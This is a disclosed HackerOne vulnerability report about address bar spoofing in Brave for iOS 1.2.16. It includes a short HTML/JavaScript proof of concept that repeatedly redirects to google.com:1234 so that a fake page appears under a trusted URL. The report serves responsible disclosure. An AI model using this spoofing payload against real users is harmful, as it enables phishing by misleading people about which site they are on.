---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '176929'
original_report_id: '176929'
title: '[ios] Address bar spoofing in Brave for iOS'
team_handle: brave
created_at: '2016-10-20T00:40:35.997Z'
disclosed_at: '2016-10-25T21:40:42.621Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
---

# [ios] Address bar spoofing in Brave for iOS

## Metadata

- HackerOne Report ID: 176929
- Weakness: 
- Program: brave
- Disclosed At: 2016-10-25T21:40:42.621Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey

## Summary:
I've found an address bar spoofing vulnerability in the latest version of Brave for iOS.

## Products affected: 
Brave for iOS 1.2.16

*(Android maybe?)*

## PoC:
```html
<script>
  var spoof = function(){
      document.write("<h1>This is not Google</h1>");
      document.location = "https://google.com:1234";
      setInterval(function(){document.location="https://google.com:1234";},9800);
  };
</script>

<input type="button" value="Spoof" onclick="spoof();" />
```

## Supporting Material/References:
{F128949}

Regards,
Ibram

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
